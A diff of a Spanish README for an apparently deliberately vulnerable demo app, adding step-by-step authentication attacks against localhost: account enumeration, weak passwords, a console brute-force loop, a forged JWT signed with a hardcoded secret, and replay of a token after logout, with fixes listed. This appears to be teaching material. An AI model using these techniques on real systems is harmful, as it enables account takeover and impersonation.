@@ -10,7 +10,6 @@ docker compose up -d                       # PostgreSQL en :5432
 cd backend && mvn spring-boot:run          # API en :8080
 cd frontend && npm install && npm run dev  # Web en :5173
 ```
-(Sin Docker: creá una base `cuidadores` con usuario/clave `postgres`, o ajustá `application.properties`.)
 
 Al arrancar por primera vez, el backend carga automáticamente 5 perfiles de ejemplo en distintas zonas (ver `DataSeeder.java`), junto con dos usuarios de prueba: `ana@demo.com` y `luis@demo.com`, ambos con contraseña `demo1234`.
 
@@ -55,18 +54,81 @@ Se exige estar logueado, pero no se verifica que el perfil sea tuyo (`ProfileCon
 
 **Corrección:** comparar `ownerId` con el usuario del token y responder 403 si no coincide.
 
-### 3. Broken Authentication (OWASP A07) — contraseñas y tokens
+### 3. Broken Authentication (OWASP A07, CWE-287) — contraseñas, login y tokens
 
-#### 3a. Política de contraseñas débil y sin límite de intentos
-**Comprobación:** registrate con la contraseña `1`: el sistema la acepta. Después intentá iniciar sesión con contraseñas incorrectas varias veces seguidas: no hay bloqueo ni demora creciente.
+#### 3a. Política de contraseñas débil (CWE-521), enumeración de cuentas (CWE-204) y sin límite de intentos (CWE-307)
 
-#### 3b. Secreto de firma JWT débil y hardcodeado
-**Comprobación:** en `JwtService.java`, el secreto con el que se firman todos los tokens es un texto corto y fijo (`SECRET = "cuidadores2026"`), visible en el repositorio. Quien lo conozca puede firmar un token válido para cualquier usuario.
+**Paso a paso — Enumeración de cuentas:**
+1. En el panel **"Ingresar"** de http://localhost:5173, escribí un correo que no exista (ej. `noexiste@demo.com`) y cualquier contraseña (ej. `1234`). Hacé clic en **Ingresar**.
+2. Observá el mensaje de error: **`"El usuario no existe"`**.
+3. Ahora cambiá el correo por uno real (`ana@demo.com`) con una contraseña equivocada (`1234`) y hacé clic en **Ingresar**.
+4. Observá que el mensaje cambia a: **`"Contraseña incorrecta"`** (esto le confirma a un atacante que `ana@demo.com` tiene cuenta en el sistema).
 
-#### 3c. Token sin expiración ni revocación
-**Comprobación:** iniciá sesión, copiá el token de Local Storage, hacé clic en "Salir", y usá ese mismo token en un `curl` a `POST /api/profiles`: sigue funcionando, porque el token no tiene fecha de expiración ni se invalida del lado del servidor.
+**Paso a paso — Política de contraseñas débil:**
+1. Hacé clic en **"No tengo cuenta"** para pasar al formulario **"Crear cuenta"**.
+2. Registrate con `prueba@demo.com` y contraseña **`1`** (o `1234`).
+3. El sistema acepta la contraseña débil y crea la cuenta inmediatamente.
 
-**Correcciones:** exigir contraseñas de 12+ caracteres y bloqueo tras varios intentos fallidos; clave de firma aleatoria desde variable de entorno; expiración corta (15 min) + refresh token + lista de revocación.
+**Paso a paso — Fuerza bruta sin límite de intentos:**
+1. Abrí la consola del navegador (**F12** → **Console**) y ejecutá este script que prueba una lista de contraseñas contra `ana@demo.com`:
+   ```js
+   for (const pass of ["1234", "admin", "password", "qwerty", "111111", "demo1234"]) {
+     const r = await fetch("http://localhost:8080/api/auth/login", {
+       method: "POST",
+       headers: { "Content-Type": "application/json" },
+       body: JSON.stringify({ email: "ana@demo.com", password: pass })
+     });
+     console.log(pass, "->", r.status, await r.json());
+   }
+   ```
+2. Vas a ver en consola que el servidor permite todos los intentos seguidos sin bloquear ni demorar (`429 Too Many Requests`), hasta que en `"demo1234"` devuelve `200 OK` y entrega el token de Ana.
+
+#### 3b. Secreto de firma JWT débil y hardcodeado (CWE-798 / CWE-321)
+En `JwtService.java`, la clave con la que se firman los tokens está escrita en el código (`SECRET = "cuidadores2026"`). Cualquiera con acceso al repositorio puede fabricar un token válido para suplantar a otro usuario sin conocer su contraseña.
+
+**Paso a paso — Suplantación de identidad falsificando un token:**
+1. Si estás logueado en la web, hacé clic en **"Salir"**.
+2. Con el secreto `"cuidadores2026"` se firma un token para `userId: 1` (`ana@demo.com`). Abrí **F12** → **Console**, pegá este comando con el token ya firmado con esa clave y presioná **Enter**:
+   ```js
+   localStorage.setItem("session", JSON.stringify({
+     userId: 1,
+     token: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwiZW1haWwiOiJhbmFAZGVtby5jb20ifQ.4z7fOB26jfXaAbxLcCOantbL2N4CUI_DiLBDr5c_yas"
+   }));
+   location.reload();
+   ```
+3. La página se recarga y quedás dentro de la cuenta de **Ana** (aparece el botón **"Editar"** en sus perfiles y te permite modificarlos) sin haber pasado por el login ni conocer su contraseña.
+
+#### 3c. Token sin expiración ni revocación (CWE-613)
+En `JwtService.generate`, el token se emite sin fecha de vencimiento (`exp`) y el servidor no invalida tokens al cerrar sesión.
+
+**Paso a paso:**
+1. Iniciá sesión con `ana@demo.com` (`demo1234`).
+2. En **F12** → **Console**, guardate el token en una variable antes de salir:
+   ```js
+   window.tokenRobado = JSON.parse(localStorage.getItem("session")).token;
+   ```
+3. Hacé clic en el botón **"Salir"** arriba a la derecha en la web (la sesión se borra del navegador).
+4. Desde la misma consola (**F12**), usá el `tokenRobado` para crear un perfil en nombre de Ana aunque ya haya cerrado sesión:
+   ```js
+   fetch("http://localhost:8080/api/profiles", {
+     method: "POST",
+     headers: {
+       "Content-Type": "application/json",
+       "Authorization": "Bearer " + window.tokenRobado
+     },
+     body: JSON.stringify({
+       nombre: "Perfil creado tras cerrar sesión",
+       apellido: "Token sin revocar",
+       zona: "Nueva Córdoba",
+       estudios: "Demo 3c",
+       intereses: "Seguridad",
+       descripcion: "El token sigue siendo aceptado por el backend después del logout."
+     })
+   }).then(() => location.reload());
+   ```
+5. Al recargarse la página, aparece el nuevo perfil creado porque el token sigue siendo válido indefinidamente.
+
+**Correcciones:** exigir contraseñas de 12+ caracteres; devolver siempre el mismo mensaje genérico (`"Email o contraseña incorrectos"`); bloquear o aplicar retardo tras varios intentos fallidos; cargar una clave de firma aleatoria de 256 bits desde variable de entorno (`JWT_SECRET`); agregar expiración corta (`exp`) y lista de revocación en logout.
 
 ## Controles de seguridad ya presentes
 - Contraseñas almacenadas con hash BCrypt.
